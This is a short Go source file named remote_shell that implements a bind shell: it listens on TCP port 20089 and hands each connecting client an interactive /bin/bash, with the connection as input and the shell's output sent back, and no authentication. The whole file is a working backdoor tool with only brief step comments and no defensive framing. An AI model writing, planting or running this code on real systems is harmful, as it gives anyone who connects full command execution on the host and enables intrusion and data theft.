package remote_shell

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func RemoteShell(){
	// 1. listen for incoming connections
	listener, err := net.Listen("tcp", ":20089")
	if err!=nil{
		log.Fatalln(err)
	}
	// 2. handle said connection
	for{
		conn, err := listener.Accept()
		if err!=nil{
			log.Fatalln(err)
		}
		go handlerFunc(conn)
	}
}

func handlerFunc(conn net.Conn){
	// 1. create a command object
	cmd := exec.Command("/bin/bash", "-i")
	// 2. create a pipe object
	rp, wp := io.Pipe()
	// 3. set Stdin, StdOut for command: stdin -> conn obj, stdout -> wp object
	cmd.Stdin = conn
	cmd.Stdout= wp
	// 4. copy the result from rp to conn obj
	go io.Copy(conn, rp)

	cmd.Run()
	conn.Close()
}